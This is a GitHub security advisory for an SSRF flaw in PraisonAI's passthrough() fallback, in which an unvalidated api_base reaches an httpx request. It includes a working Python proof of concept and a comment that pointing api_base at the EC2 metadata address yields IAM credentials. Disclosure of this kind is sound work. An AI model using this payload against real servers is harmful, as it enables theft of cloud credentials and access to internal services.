# [H] PraisonAI: SSRF via Unvalidated api_base in passthrough() Fallback

## Summary
Severity: High
Advisory: GHSA-x6m9-gxvr-7jpv
CVE: CVE-2026-34936
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-x6m9-gxvr-7jpv
Type: github-advisory

## Affected
- PyPI: `praisonai` — affected >=0 <4.5.90

## Details
### Summary

`passthrough()` and `apassthrough()` in `praisonai` accept a caller-controlled `api_base` parameter that is concatenated with `endpoint` and passed directly to `httpx.Client.request()` when the litellm primary path raises `AttributeError`. No URL scheme validation, private IP filtering, or domain allowlist is applied, allowing requests to any host reachable from the server.

### Details

`passthrough.py:92` (source) -> `passthrough.py:109` (fallback trigger) -> `passthrough.py:110` (sink)
```python
# source -- api_base taken directly from caller
def passthrough(endpoint, api_base=None, method="GET", ...):

# fallback trigger -- AttributeError from unrecognised provider enters fallback
except AttributeError:
    url = f"{api_base or 'https://api.openai.com'}{endpoint}"

# sink -- no validation before request
    response = client.request(method, url=url, ...)
```

### PoC
```python
# tested on: praisonai 1.5.87 (source install)
# install: pip install -e src/praisonai
# start listener: python3 -m http.server 8888
import sys, litellm
sys.path.insert(0, 'src/praisonai')
del litellm.llm_passthrough_route

from praisonai.capabilities.passthrough import passthrough

result = passthrough(
    endpoint="/ssrf-test",
    api_base="http://127.0.0.1:8888",
    method="GET",
    custom_llm_provider="__nonexistent__",
)
print(result)
# expected output: PassthroughResult(data='...', status_code=404, headers={'server': 'SimpleHTTP/0.6 Python/3.12.3', ...})
# listener logs: "GET /ssrf-test HTTP/1.1" 404
# on EC2 with IMDSv1: api_base="http://169.254.169.254" returns IAM credentials
```

### Impact

On cloud infrastructure with IMDSv1 enabled, an attacker can retrieve IAM credentials via the EC2 metadata service. Internal services (Redis, Elasticsearch, Kubernetes API) are reachable without authentication from within the VPC. The Flask API server deploys with `AUTH_ENABLED = False` by default, making this reachable over the network without credentials.

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-x6m9-gxvr-7jpv
- https://nvd.nist.gov/vuln/detail/CVE-2026-34936
- https://github.com/MervinPraison/PraisonAI
